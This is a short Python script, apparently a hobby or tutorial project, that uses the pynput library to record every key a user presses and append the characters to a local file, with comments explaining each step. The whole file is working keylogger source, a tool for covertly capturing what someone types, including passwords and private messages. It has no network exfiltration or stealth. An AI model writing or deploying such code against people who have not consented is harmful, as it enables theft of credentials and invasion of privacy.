from pynput import keyboard

def keyPressed(key):
    # The following option is optional, it only displays the pressed keys in the console
    print(str(key))
    with open("key-logger\keyfile.txt", "a") as logKey:
        try:
            # If the program recognizes the key, it will be saved to "keyfile.txt"
            char = key.char
            logKey.write(char)
        except:
            # If the program does not recognize the key, the following message will appear
            print("Error getting char...")

if __name__ == "__main__":
    # The "listener" variable contains the keys pressed by the user
    listener = keyboard.Listener(on_press=keyPressed)

    # Here we start fetching the keys pressed by the user
    listener.start()
    input()